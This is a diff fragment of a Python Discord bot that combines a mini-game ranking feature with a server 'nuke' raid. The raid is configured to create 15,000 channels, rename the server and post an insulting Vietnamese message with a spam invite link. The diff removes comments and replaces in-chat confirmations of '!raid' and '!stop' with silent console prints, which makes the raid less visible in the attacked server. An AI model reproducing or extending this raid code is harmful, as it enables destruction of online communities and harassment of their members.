@@ -14,10 +14,10 @@ OWNER_ID = 1413781843030966345
 RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
 CHANNEL_COUNT = 15000
 BATCH_SIZE = 80
-SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"  # Link mặc định
+SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"
 SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
 NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯𝐮𝐢𝐯𝐞 👑"
-raid_active = True  # Biến toàn cục kiểm soát raid
+raid_active = True
 
 # ===== CẤU HÌNH MINI GAME =====
 DATA_FILE = "rankings.json"
@@ -415,23 +415,19 @@ async def on_message(message):
     if message.content.startswith("!raid"):
         parts = message.content.split()
         if not message.guild and len(parts) > 1:
-            # DM: lưu link spam mới
             new_link = parts[1]
             if new_link.startswith(("http://", "https://")):
                 SPAM_LINK = new_link
-                await message.channel.send(f"✅ Đã cập nhật link spam thành: {SPAM_LINK}")
+                print(f"[*] Link spam đã được cập nhật: {SPAM_LINK}")
             else:
-                await message.channel.send("❌ Link không hợp lệ. Hãy gửi link bắt đầu bằng http:// hoặc https://")
+                print("[!] Link không hợp lệ.")
         elif message.guild:
-            # Server: nuke server này với link đã lưu
             await raid(message.guild)
-            await message.channel.send("✅ NUKE STARTED (spam link đã lưu)")
-        else:
-            await message.channel.send("❌ Hãy gửi !raid <link> trong DM để cập nhật link spam.")
+            print(f"[*] Raid started in {message.guild.name}")
 
     elif message.content.lower() == "!stop":
         raid_active = False
-        await message.channel.send("✅ Đã dừng raid (không tắt bot). Gõ !raid để bắt đầu lại.")
+        print("[*] Raid stopped by owner.")
 
 @client.event
 async def on_member_remove(member):
